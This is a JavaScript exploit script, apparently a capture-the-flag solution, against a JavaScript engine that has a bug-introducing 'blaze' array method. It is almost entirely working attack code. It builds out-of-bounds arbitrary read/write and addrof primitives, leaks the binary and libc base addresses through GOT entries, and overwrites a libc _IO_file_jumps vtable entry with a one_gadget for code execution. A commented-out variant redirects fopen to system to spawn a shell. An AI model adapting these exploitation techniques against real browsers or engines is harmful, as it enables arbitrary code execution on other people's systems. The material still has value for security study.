load('utils.js');
load('int64.js');
load('resolver.js');
 
var buf = new ArrayBuffer(8); 
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); 
}

function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

function arb_write(addr, value) {
	x = new Array(1.1, 2.2, 3.3, 4.4, 5.5, 6.6);
	y = new Uint8Array(8);
	x.blaze();
	save = x[13];
	x[13] = itof(addr)
	y[0] = Number(value);
	x[13] = save;
}

function arb_w8(addr, value) {
	var i;
	value = BigInt(value);
	for (i = 0; i < 8; i ++) {
		v = BigInt(value & 0xffn);
		arb_write(addr, v);
		value = value >> 8n;
		addr += 1n;
	}
}

function arb_read(addr, size) {
	var a1 = new Array(1, 2, 3, 4);
	var a2 = new Uint8Array(8);
	a1.blaze();

	a1[13] = itof(addr)
	return a2.slice(0, size);
}

function arb_r1(addr) {
	v0 = arb_read(addr);
	return Number(v0[0]);
}

function arb_r2(addr) {
	v0 = arb_read(addr);
	pointer = BigInt(v0[0]) + (BigInt(v0[1]) << 8n);
	return pointer;
}

function arb_r4(addr) {
	v0 = arb_read(addr);
	pointer = BigInt(v0[0]) + (BigInt(v0[1]) << 8n) + (BigInt(v0[2]) << 16n) + (BigInt(v0[3]) << 24n);
	return pointer;
}

function arb_r8(addr) {
	v0 = arb_read(addr);
	pointer = BigInt(v0[0]) + (BigInt(v0[1]) << 8n) + (BigInt(v0[2]) << 16n) + (BigInt(v0[3]) << 24n) + (BigInt(v0[4]) << 32n) + (BigInt(v0[5]) << 40n);
	return pointer;
}

function addrof(obj) {
	var a1 = new Array(1, 2, 3, 4);
	var a2 = new Uint8Array(8);
	a1.blaze();	
	a1[14] = obj;
	return a2.slice(0, 8);
}

 
var x1 = new Array(1, 2, 3, 4);
var x2 = new Uint8Array(8);
x1.blaze();

// Leaking main image base
// This offset should be constant for each patch level
let code_base = ftoi(x1[8]) - 0x110f6c8n;
console.log("[+] ELF image_base leaked:\t0x"+code_base.toString(16));
// JS resolver to get main image R_X86_64_JUMP_SLOT based symbols
let image_syms = resolve_relocs(code_base, R_X86_64_JUMP_SLOT);

/*
// With Partial RELRO this should be enough to pop a shell
let got_system = image_syms['system'];
let got_fopen = image_syms['fopen'];
let libc_system = arb_r8(got_system);
console.log("[+] GOT system at:\t\t0x"+got_system.toString(16));
console.log("[+] libc system at:\t\t0x"+libc_system.toString(16));
arb_w8(got_fopen, libc_system);
load("/usr/bin/xcalc");
// Also this  RELRO this may just work
arb_write(image_syms["gettimeofday"], one_gadget);
Date.now();
*/

// Resolving LIBC base from the first GOT entry of the main image
let first_got_entry_addr = image_syms["__cxa_finalize"];
let first_got_entry = arb_r8(first_got_entry_addr);
console.log("[+] first GOT entry addr:\t0x"+first_got_entry_addr.toString(16));

var libc_base = 0;
var libc_header = 0;
var delta = BigInt(0x1000 * 65);
first_got_entry_delta = first_got_entry % BigInt(Math.pow(2,8));
first_got_entry = BigInt(first_got_entry - first_got_entry_delta);
console.log("[+] Attempting to find libc base");
console.log("\t- Starting from address: 0x" + (first_got_entry).toString(16));
for (var x=0; x < 10; x++) {
	delta = delta + 0x1000n;
	libc_header = arb_r8(first_got_entry-delta);	
	if (libc_header == 0x102464c457f) {
		libc_base = BigInt(first_got_entry-delta);
		break;
	}
}

if (libc_base == 0) {
	console.log("[-] Failed to leak libc");
}
console.log("[+] libc base leaked:\t0x"+libc_base.toString(16));

// Resolving _IO_file_jump vtable from LIBC symbols
let libc_io_file_jumps = resolve_symbol(libc_base, "_IO_file_jumps");
console.log("[+] libc _IO_file_jumps 0x"+libc_io_file_jumps.toString(16));
// Overwritting an entry from vtable
one_gadget = new Int64((libc_base + 0xe6c7en+3n).toString(16));
console.log("[+] one gadget addr: "+ one_gadget.toString(16));
// overwritting this entry also works: arb_w8(libc_io_file_jumps + 0x18n, one_gadget);
arb_w8(libc_io_file_jumps + 0x38n, one_gadget);
// Vtable entry gets called
console.log("pwn");

